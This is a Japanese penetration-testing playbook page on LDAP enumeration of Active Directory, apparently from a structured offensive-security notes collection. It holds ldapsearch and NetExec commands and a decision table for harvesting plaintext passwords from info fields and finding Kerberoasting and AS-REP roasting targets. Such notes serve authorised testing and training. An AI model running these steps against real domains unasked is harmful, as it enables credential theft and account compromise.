# LDAP列挙

## 着火条件
389 (LDAP) または 636 (LDAPS) が開いており、AD 環境と判断した場合。
匿名バインドでも部分情報が取れるが、認証情報が取れた時点で本格的に実施する。

---

## 観点・着眼点

**何が出たら次に何をするか：**

| 観測される出力 | 示唆 | 次のアクション |
|------------|-----|------------|
| `info` / `description` フィールドに文字列がある | 運用メモとしてパスワードが書かれていることがある | `grep -i "pass\|pwd\|cred"` で抽出 → そのまま認証情報として試す |
| `servicePrincipalName` が設定されたユーザーがある | Kerberoast 可能なサービスアカウント | SPN を持つユーザーに対して Kerberoasting |
| `userAccountControl` に `DONT_REQ_PREAUTH` フラグ（値 4194304） | AS-REP Roasting が可能 | 該当ユーザーで `GetNPUsers.py` |
| `memberOf` に `Domain Admins` / `Enterprise Admins` | 高権限ユーザーの特定 | そのユーザーの認証情報取得が最優先目標 |
| `pwdLastSet=0` | 初回ログイン前 / パスワードリセット直後 | 既定パスワードの可能性 |
| `adminCount=1` だが `Domain Admins` 外 | 過去に特権を持っていたアカウント（AdminSDHolder） | BloodHound で現在の ACL を確認 |
| 匿名バインドで `sizeLimitExceeded` が返る | 匿名でも検索が通っている | 検索範囲・属性を絞って再実行 |
| 匿名バインドで `operationsError` | 匿名アクセスは拒否されている | 認証情報取得まで後回し |

**カスタム属性の扱い：** 標準属性だけでなく `info`、社内で独自追加された属性にも目を通す。`info` は GUI の「説明」欄とは別のフィールドで、GUI では編集されにくいため平文パスワードが残っていることがある。

---

## 手順

**匿名バインドの試行（最初の一手）：**
```bash
ldapsearch -x -H ldap://[IP] -b "DC=[domain],DC=[tld]"
# サブツリー指定なしで naming context を列挙
ldapsearch -x -H ldap://[IP] -s base namingcontexts
```

**基本的なユーザー列挙：**
```bash
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" \
  -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" \
  "(objectClass=user)" sAMAccountName info description memberOf userAccountControl
```

**全属性を取得（詳細調査）：**
```bash
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" \
  -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" \
  "(objectClass=user)"
```

**コンピューターアカウントの列挙：**
```bash
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" \
  -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" \
  "(objectClass=computer)" sAMAccountName dNSHostName operatingSystem
```

**SPN 付きユーザーの抽出（Kerberoast 候補）：**
```bash
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

**AS-REP Roast 対象の抽出：**
```bash
# userAccountControl のビット 22 (DONT_REQ_PREAUTH = 0x400000)
ldapsearch ... "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

**認証情報候補の一括抽出：**
```bash
ldapsearch ... | grep -i "info\|description\|pass\|pwd\|cred"
```

**NetExec を使った高速列挙：**
```bash
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --users
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --kerberoasting kerberoast.out
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --asreproast asrep.out
```

---

## 注意点・落とし穴

- `info` フィールドは GUI（Active Directory ユーザーとコンピューター）の「説明」欄とは別の、あまり目立たないフィールド。GUI 運用だと見落とされがち
- デフォルトの `sizeLimit` は 1000 件。超えると結果が途中で切れる。`-E pr=500/noprompt` のページング指定で回避
- 大量の出力は `tee` でファイルに保存しながら確認する（後からの `grep` のため）
- 匿名バインドが通っても `objectClass=user` で中身が返らない環境がある。その場合は `(objectClass=*)` や `domain` レベルで再度試す
- DN の `DC=` 部分を間違えると結果が空になるだけでエラーは返らない。必ず `namingcontexts` で正しい DN を先に確認する
- ldap:// と ldaps:// で結果が変わることはほぼないが、認証情報送信の安全性のため資格情報を送る際は ldaps:// を優先

---

## 関連技術
- ユーザー一覧が取得できた → パスワードスプレー: `../05_Tools_Reference/NetExec.md`
- SPN 付きユーザーを発見 → `../04_Post_Access_Windows_AD/Kerberos_Attacks/Kerberoasting.md`
- AS-REP Roast 可能ユーザーを発見 → `../04_Post_Access_Windows_AD/Kerberos_Attacks/AS_REP_Roasting.md`（存在する場合）
- 全体の権限マッピング → `../05_Tools_Reference/BloodHound.md`
- `info` フィールドにパスワード → `../02_Initial_Access/Credential_Discovery.md`
- rpcclient / SMB 側の列挙と併用 → `./SMB_Enumeration.md`、`../02_Initial_Access/Protocol_Exploitation.md`
